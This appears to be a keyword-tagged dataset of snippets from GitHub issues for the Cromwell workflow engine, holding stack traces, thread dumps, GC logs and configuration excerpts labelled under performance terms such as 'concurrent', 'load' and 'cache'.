slick.jdbc.JdbcBackend.createDatabase(JdbcBackend.scala:35); 	at slick.jdb",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6830:1108,load,loadClass,1108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6830,1,['load'],['loadClass']
Performance," after following [this tutorial](https://cromwell.readthedocs.io/en/develop/backends/GCPBatch/), I encounter the following error:. ```; com.google.api.gax.rpc.InvalidArgumentException: io.grpc.StatusRuntimeException: INVALID_ARGUMENT: network field is invalid. network: projects/${project_id}/global/networks/${network_id}/ is not matching the expected format: global/networks/([a-z]([-a-z0-9]*[a-z0-9])?)$; 	at com.google.api.gax.rpc.ApiExceptionFactory.createException(ApiExceptionFactory.java:92); 	at com.google.api.gax.rpc.ApiExceptionFactory.createException(ApiExceptionFactory.java:41); 	at com.google.api.gax.grpc.GrpcApiExceptionFactory.create(GrpcApiExceptionFactory.java:86); 	at com.google.api.gax.grpc.GrpcApiExceptionFactory.create(GrpcApiExceptionFactory.java:66); 	at com.google.api.gax.grpc.GrpcExceptionCallable$ExceptionTransformingFuture.onFailure(GrpcExceptionCallable.java:97); 	at com.google.api.core.ApiFutures$1.onFailure(ApiFutures.java:84); 	at com.google.common.util.concurrent.Futures$CallbackListener.run(Futures.java:1133); 	at com.google.common.util.concurrent.DirectExecutor.execute(DirectExecutor.java:31); 	at com.google.common.util.concurrent.AbstractFuture.executeListener(AbstractFuture.java:1277); 	at com.google.common.util.concurrent.AbstractFuture.complete(AbstractFuture.java:1038); 	at com.google.common.util.concurrent.AbstractFuture.setException(AbstractFuture.java:808); 	at io.grpc.stub.ClientCalls$GrpcFuture.setException(ClientCalls.java:574); 	at io.grpc.stub.ClientCalls$UnaryStreamToFuture.onClose(ClientCalls.java:544); 	at io.grpc.PartialForwardingClientCallListener.onClose(PartialForwardingClientCallListener.java:39); 	at io.grpc.ForwardingClientCallListener.onClose(ForwardingClientCallListener.java:23); 	at io.grpc.ForwardingClientCallListener$SimpleForwardingClientCallListener.onClose(ForwardingClientCallListener.java:40); 	at com.google.api.gax.grpc.ChannelPool$ReleasingClientCall$1.onClose(ChannelPool.java:541); 	at io.grpc.internal.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7500:1113,concurren,concurrent,1113,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7500,1,['concurren'],['concurrent']
Performance," and restarted = false cannot be started and should not have been fetched.; at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:60); at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:56); at cromwell.engine.workflow.workflowstore.SqlWorkflowStore.$anonfun$fetchStartableWorkflows$1(SqlWorkflowStore.scala:57); at scala.util.Success.$anonfun$map$1(Try.scala:251); at scala.util.Success.map(Try.scala:209); at scala.concurrent.Future.$anonfun$map$1(Future.scala:288); at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:29); at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:29); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```; :hmmm:. chrisl [4:50 PM]; that sort of looks like the kind of error message I put in when I’m 99% sure a situation is impossible…. mcovarr [4:50 PM]; workflows that are picked up but have old heartbeats will look eligible for pickup, but they won't actually get run and you'll see that message. chrisl [4:50 PM]; oh, or that :slightly_smiling_face:. kshakir [4:51 PM]; I ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3673:1344,concurren,concurrent,1344,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3673,1,['concurren'],['concurrent']
Performance," at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:427) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469) ~[cromwell.jar:0.19]; at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357) ~[cromwell.jar:0.19]; at java.util.concurrent.FutureTask.run(FutureTask.java:266) [na:1.8.0_72]; at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala:121) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; 2016-06-01T20:19:40.362-0400: 104296.863: [GC (Allocation Failure) [PSYoungGen: 1130870K->235812K(1864192K)] 3755109K->2861554K(7456768K), 0.0464226 secs] [Times: user=0.25 sys=0.00, real=0.04 secs] ; 2016-06-01T20:19:42.554-0400: 104299.055: [GC (Allocation Failure) [PSYoungGen: 1052454K->177588K(1864192K)] 3678197K->2815074K(7456768K), 0.0805924 secs] [Times: user=0.59 sys=0.00, real=0.08 secs] ; 2016-06-01T20:20:06.449-0400: 104322.950: [GC (Allocation Failure) [PSYoungGen: 1109940K->381765K(1864192K)] 3747426K->3196632K(7456768K), 0.1380993 secs] [Times: user=1.00 sys=0.01, real=0.14 secs] ; 2016-06-01T20:20:06.832-0400: 104323.333: [GC (Allocation Failure) [PSYoungGen: 1157703K->173892K(1864192K)] 3972570K->3267545K(7456768K), 0.0688009 secs] [Times: user=0.50 sys=0.00, real=0.07 secs] ; 2016-06-",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/932:5344,concurren,concurrent,5344,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/932,1,['concurren'],['concurrent']
Performance, at com.google.cloud.storage.StorageImpl$5.call(StorageImpl.java:179); at com.google.cloud.RetryHelper.doRetry(RetryHelper.java:179); at com.google.cloud.RetryHelper.runWithRetries(RetryHelper.java:244); at com.google.cloud.storage.StorageImpl.get(StorageImpl.java:179); at com.google.cloud.storage.StorageImpl.get(StorageImpl.java:193); at com.google.cloud.storage.contrib.nio.CloudStorageReadChannel.fetchSize(CloudStorageReadChannel.java:144); at com.google.cloud.storage.contrib.nio.CloudStorageReadChannel.create(CloudStorageReadChannel.java:53); at com.google.cloud.storage.contrib.nio.CloudStorageFileSystemProvider.newReadChannel(CloudStorageFileSystemProvider.java:258); at com.google.cloud.storage.contrib.nio.CloudStorageFileSystemProvider.newByteChannel(CloudStorageFileSystemProvider.java:222); at java.nio.file.Files.newByteChannel(Files.java:361); at java.nio.file.Files.newByteChannel(Files.java:407); at java.nio.file.Files.readAllBytes(Files.java:3152); at better.files.File.loadBytes(File.scala:163); at better.files.File.byteArray(File.scala:166); at better.files.File.contentAsString(File.scala:206); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor$$anonfun$cromwell$backend$impl$jes$JesAsyncBackendJobExecutionActor$$returnCodeContents$1.apply(JesAsyncBackendJobExecutionActor.scala:111); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor$$anonfun$cromwell$backend$impl$jes$JesAsyncBackendJobExecutionActor$$returnCodeContents$1.apply(JesAsyncBackendJobExecutionActor.scala:111); at scala.util.Try$.apply(Try.scala:192); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.cromwell$backend$impl$jes$JesAsyncBackendJobExecutionActor$$returnCodeContents$lzycompute(JesAsyncBackendJobExecutionActor.scala:111); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.cromwell$backend$impl$jes$JesAsyncBackendJobExecutionActor$$returnCodeContents(JesAsyncBackendJobExecutionActor.scala:111); at cromwell.backend.impl.jes.JesAsyncBackendJobEx,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1782:2026,load,loadBytes,2026,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1782,1,['load'],['loadBytes']
Performance," at com.jprofiler.agent.sampler.Sampler.run(ejt:84). ""Attach Listener"" #33 daemon prio=9 os_prio=31 tid=0x00007fb76e3e7800 nid=0x8507 runnable [0x0000000000000000]; java.lang.Thread.State: RUNNABLE. ""db-4"" #31 daemon prio=5 os_prio=31 tid=0x00007fb7706e2000 nid=0x8303 waiting on condition [0x000000012ca92000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""db-3"" #29 daemon prio=5 os_prio=31 tid=0x00007fb76f4b7000 nid=0x7f03 waiting on condition [0x000000012c88c000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(Managed",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:37062,concurren,concurrent,37062,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance," at java.lang.Object.wait(Native Method); at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:143); - locked <0x00000006c00371c0> (a java.lang.ref.ReferenceQueue$Lock); at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:164); at java.lang.ref.Finalizer$FinalizerThread.run(Finalizer.java:209). ""Reference Handler"" #2 daemon prio=10 os_prio=31 tid=0x00007fb76b005800 nid=0x3303 in Object.wait() [0x0000000126ac4000]; java.lang.Thread.State: WAITING (on object monitor); at java.lang.Object.wait(Native Method); at java.lang.Object.wait(Object.java:502); at java.lang.ref.Reference$ReferenceHandler.run(Reference.java:157); - locked <0x00000006c00301d8> (a java.lang.ref.Reference$Lock). ""main"" #1 prio=5 os_prio=31 tid=0x00007fb76a803000 nid=0xf07 waiting on condition [0x000000010b088000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c061d308> (a scala.concurrent.impl.Promise$CompletionLatch); at java.util.concurrent.locks.LockSupport.park(Redefined); at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:836); at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedInterruptibly(AbstractQueuedSynchronizer.java:997); at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireSharedInterruptibly(AbstractQueuedSynchronizer.java:1304); at scala.concurrent.impl.Promise$DefaultPromise.tryAwait(Promise.scala:199); at scala.concurrent.impl.Promise$DefaultPromise.ready(Promise.scala); at scala.concurrent.impl.Promise$DefaultPromise.ready(Promise.scala); at scala.concurrent.Await$$anonfun$ready$1.apply(package.scala); at scala.concurrent.Await$$anonfun$ready$1.apply(package.scala); at scala.concurrent.BlockContext$DefaultBlockContext$.blockOn(BlockContext.scala); at scala.concurrent.Await$.ready(package.scala:169); at cromwell.Main.cromwell$Main$$waitAndExit(Main.scala); at cromwell.Main$$anonfun$runServer$2.apply$mcI$sp(Main.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:50509,concurren,concurrent,50509,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance," at scala.concurrent.forkjoin.ForkJoinPool.managedBlock(Redefined); at scala.concurrent.impl.ExecutionContextImpl$DefaultThreadFactory$$anon$2.blockOn(ExecutionContextImpl.scala:44); at scala.concurrent.Await$.ready(package.scala:169); at akka.actor.ActorSystemImpl.awaitTermination(ActorSystem.scala); at akka.actor.ActorSystemImpl.awaitTermination(ActorSystem.scala); at cromwell.server.CromwellServer$$anonfun$run$1.applyOrElse(CromwellServer.scala:29); at cromwell.server.CromwellServer$$anonfun$run$1.applyOrElse(CromwellServer.scala); at scala.concurrent.Future$$anonfun$andThen$1.apply(Future.scala:433); at scala.concurrent.Future$$anonfun$andThen$1.apply(Future.scala); at scala.concurrent.impl.CallbackRunnable.run(Redefined); at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(Redefined); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java). ""cromwell-system-scheduler-1"" #14 prio=5 os_prio=31 tid=0x00007fb76aa14800 nid=0x6103 runnable [0x00000001295b3000]; java.lang.Thread.State: RUNNABLE; at com.jprofiler.agent.InstrumentationCallee.exitFilteredMethod(Native Method); at com.jprofiler.agent.InstrumentationCallee.__ejt_filter_exitMethod(ejt:86); at akka.actor.LightArrayRevolverScheduler.clock(Scheduler.scala:213); at akka.actor.LightArrayRevolverScheduler$$anon$8.nextTick(Redefined); at akka.actor.LightArrayRevolverScheduler$$anon$8.run(Redefined); at java.lang.Thread.run(Redefined). ""cromwell-system-akka.actor.default-dispatcher-4"" #13 prio=5 os_prio=31 tid=0x00007fb76b38c000 nid=0x5f03 waiting on condition [0x000000012ac3d000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c002f9e0> (a akka.dispatch.ForkJoinExecutorConfigura",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:46456,concurren,concurrent,46456,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance," attempt to restart this workflow?* This took over 4 hours to get this error message and I do not want to incur the cost if it will fail the same way again. Side issues:; - My workflow failed and yet cromwell is still *mauling* the mysql server.; - The call cache lookups are taking >1 hour per task. Main issue:. I do not understand the error messages, but my workflow has entered a Failed state and I am not sure why. First, I see a bunch of NPE:; ```; [ERROR] [05/01/2017 17:36:00.055] [cromwell-system-akka.dispatchers.engine-dispatcher-84] [akka.dispatch.Dispatcher] null; java.lang.NullPointerException; at cromwell.engine.workflow.lifecycle.execution.callcaching.CallCacheWriteActor.receiver(CallCacheWriteActor.scala:17); at cromwell.engine.workflow.lifecycle.execution.callcaching.CallCacheWriteActor$$anonfun$1.apply(CallCacheWriteActor.scala:21); at cromwell.engine.workflow.lifecycle.execution.callcaching.CallCacheWriteActor$$anonfun$1.apply(CallCacheWriteActor.scala:19); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at s",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228:1179,concurren,concurrent,1179,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228,1,['concurren'],['concurrent']
Performance," backend submit configuration contains an expression like:; `${""-l h_vmem="" + memory + ""G""}`: ; <details>; <summary> error message </summary>; <pre><code>; cromwell.core.CromwellFatalException: common.exception.AggregatedMessageException: Error(s):; Could not evaluate expression: ""-l h_vmem="" + memory + ""G"": Cannot perform operation: -l h_vmem= + WomLong(4); at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:47); at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:38); at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Could not evaluate expression: ""-l h_vmem="" + memory + ""G"": Cannot perform operation: -l h_vmem= + WomLong(4); at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:77); at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:73); at cromwell.backend.impl.s",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4659:1022,concurren,concurrent,1022,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4659,1,['concurren'],['concurrent']
Performance," be simply that subqueries must be aliased.](https://stackoverflow.com/q/1888779/4107809) Is MariaDB not supported? . The workflow runs jobs that complete as normal. When rerunning, no call caching results are used, and all jobs simply run again. . Cromwell connects to the call caching database and successfully creates tables, for example `CALL_CACHING_AGGREGATION_ENTRY`. . <!-- Which backend are you running? -->; I am running with a SLURM backend. . <!-- Paste/Attach your workflow if possible: -->; I have a very simple example workflow. ; ```; workflow test{; call task_A {}; }. task task_A{; command{; echo 'testing'; }; }; ```. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; ```; include required(classpath(""application"")). webservice {; }. akka {; http {; server {; }; }; }. system {; io {; }; input-read-limits {; }; job-rate-control {; jobs = 2; per = 1 second; }. abort {; scan-frequency: 30 seconds; cache {; enabled: true; concurrency: 1; ttl: 20 minutes; size: 100000; }; }. dns-cache-ttl: 3 minutes; }. workflow-options {; default {; }; }. call-caching {; enabled = true; }. google {; }. docker {; hash-lookup {; }; }. engine {; filesystems {; local {; }; }; }. languages {; WDL {; versions {; ""draft-2"" {; }; ""1.0"" {; }; }; }; CWL {; versions {; ""v1.0"" {; }; }; }; }. backend {; default = ""SLURM"". providers {. SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 500; runtime-attributes = """"""; Int runtime_minutes = 720; Int cpus = 1; Int requested_memory_mb_per_core = 8000; String queue = ""short""; """""". exit-code-timeout-seconds = 600. submit = """"""; sbatch -J ${job_name} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} -p ${queue} \; ${""-n "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --constraint=""groups"" \; --qos=ded_reich \; --account=""reich"" \; --wrap ""/usr/bin/env bash ${script}""; """"""; kill = ""scancel ${job",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6929:2574,cache,cache,2574,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6929,2,"['cache', 'concurren']","['cache', 'concurrency']"
Performance, by: java.lang.RuntimeException: Class cromwell.services.womtool.impl.WomtoolServiceInCromwellActor for service Womtool cannot be found in the class path.; 	at cromwell.services.ServiceRegistryActor$.serviceProps(ServiceRegistryActor.scala:54); 	at cromwell.services.ServiceRegistryActor$.$anonfun$serviceNameToPropsMap$2(ServiceRegistryActor.scala:37); 	at scala.collection.TraversableLike.$anonfun$map$1(TraversableLike.scala:234); 	at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:231); 	at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:462); 	at scala.collection.TraversableLike.map(TraversableLike.scala:234); 	at scala.collection.TraversableLike.map$(TraversableLike.scala:227); 	at scala.collection.AbstractTraversable.map(Traversable.scala:104); 	at cromwell.services.ServiceRegistryActor$.serviceNameToPropsMap(ServiceRegistryActor.scala:36); 	at cromwell.services.ServiceRegistryActor.serviceProps(ServiceRegistryActor.scala:63); 	at cromwell.services.ServiceRegistryActor.<init>(ServiceRegistryActor.scala:65); 	at cromwell.services.ServiceRegistryActor$.$anonfun$props$1(ServiceRegistryActor.scala:25); 	at akka.actor.TypedCreatorFunctionConsumer.produce(IndirectActorProducer.scala:87); 	at akka.actor.Props.newActor(Props.scala:212); 	at akka.actor.ActorCell.newActor(ActorCell.scala:624); 	at akka.actor.ActorCell.create(ActorCell.scala:650); 	... 9 common frames omitted; Caused by: java.lang.ClassNotFoundException: cromwell.services.womtool.impl.WomtoolServiceInCromwellActor; 	at java.net.URLClassLoader.findClass(URLClassLoader.java:381); 	at java.lang.ClassLoader.loadClass(ClassLoader.java:424); 	at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:331); 	at java.lang.ClassLoader.loadClass(ClassLoader.java:357); 	at java.lang.Class.forName0(Native Method); 	at java.lang.Class.forName(Class.java:264); 	at cromwell.services.ServiceRegistryActor$.serviceProps(ServiceRegistryActor.scala:51); 	... 24 common frames omitted; ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881:5144,load,loadClass,5144,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881,3,['load'],['loadClass']
Performance," case_gatk_acnv_workflow.TumorCalculateTargetCoverage: return code was -1""; }; ],; ""end"": ""2016-09-23T13:53:29.816Z"",; ""start"": ""2016-09-23T13:53:06.277Z""; }; ```. local_application.conf. ```; webservice {; port = 8000; interface = 0.0.0.0; instance.name = ""reference""; }. akka {; loggers = [""akka.event.slf4j.Slf4jLogger""]; actor {; default-dispatcher {; fork-join-executor {; # Number of threads = min(parallelism-factor * cpus, parallelism-max); # Below are the default values set by Akka, uncomment to tune these. #parallelism-factor = 3.0; #parallelism-max = 64; }; }; }. dispatchers {; # A dispatcher for actors performing blocking io operations; # Prevents the whole system from being slowed down when waiting for responses from external resources for instance; io-dispatcher {; type = Dispatcher; executor = ""fork-join-executor""; # Using the forkjoin defaults, this can be tuned if we wish; }. # A dispatcher for actors handling API operations; # Keeps the API responsive regardless of the load of workflows being run; api-dispatcher {; type = Dispatcher; executor = ""fork-join-executor""; }. # A dispatcher for engine actors; # Because backends behaviour is unpredictable (potentially blocking, slow) the engine runs; # on its own dispatcher to prevent backends from affecting its performance.; engine-dispatcher {; type = Dispatcher; executor = ""fork-join-executor""; }. # A dispatcher used by supported backend actors; backend-dispatcher {; type = Dispatcher; executor = ""fork-join-executor""; }. # Note that without further configuration, all other actors run on the default dispatcher; }; }. spray.can {; server {; request-timeout = 40s; }; client {; request-timeout = 40s; connecting-timeout = 40s; }; }. system {; // If 'true', a SIGINT will trigger Cromwell to attempt to abort all currently running jobs before exiting; abort-jobs-on-terminate = false. // Max number of retries per job that the engine will attempt in case of a retryable failure received from the backend; max-retries =",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1480:83746,load,load,83746,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1480,1,['load'],['load']
Performance," checkpointClose start; [2022-12-15 21:14:50,74] [info] checkpointClose synched; [2022-12-15 21:14:50,78] [info] checkpointClose script done; [2022-12-15 21:14:50,78] [info] dataFileCache commit start; [2022-12-15 21:14:50,78] [info] dataFileCache commit end; [2022-12-15 21:14:50,80] [info] checkpointClose end; [2022-12-15 21:14:50,81] [info] Checkpoint end - txts: 101877; [2022-12-15 21:14:50,81] [info] Checkpoint start; [2022-12-15 21:14:50,81] [info] checkpointClose start; [2022-12-15 21:14:50,81] [info] checkpointClose synched; [2022-12-15 21:14:50,85] [info] checkpointClose script done; [2022-12-15 21:14:50,85] [info] dataFileCache commit start; [2022-12-15 21:14:50,85] [info] dataFileCache commit end; [2022-12-15 21:14:50,87] [info] checkpointClose end; [2022-12-15 21:14:50,88] [info] Checkpoint end - txts: 101879; [2022-12-15 21:14:50,89] [info] Running with database db.url =; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-db;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=10000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hsqldb.script_format=3. [2022-12-15 21:14:50,95] [info] Checkpoint start; [2022-12-15 21:14:50,95] [info] checkpointClose start; [2022-12-15 21:14:50,95] [info] checkpointClose synched; [2022-12-15 21:14:50,98] [info] checkpointClose script done; [2022-12-15 21:14:50,98] [info] dataFileCache commit start; [2022-12-15 21:14:50,99] [info] dataFileCache commit end; [2022-12-15 21:14:51,01] [info] checkpointClose end; [2022-12-15 21:14:51,02] [info] Checkpoint end - txts: 101887; [2022-12-15 21:14:51,05] [info] Checkpoint start; [2022-12-15 21:14:51,05] [info] checkpointClose start; [2022-12-15 21:14:51,06] [info] checkpointClose synched; [2022-12-15 21:14:51,08] [info] checkpointClose script done; [2022-12-15 21:14:51,08] [info] dataFileCache commit start; [2022-12-15 21:14:51,31] [info] dataFileCache commit end; [2022-12-15 21:14:51,35] [info] checkpoint",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:8160,cache,cached,8160,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['cache'],['cached']
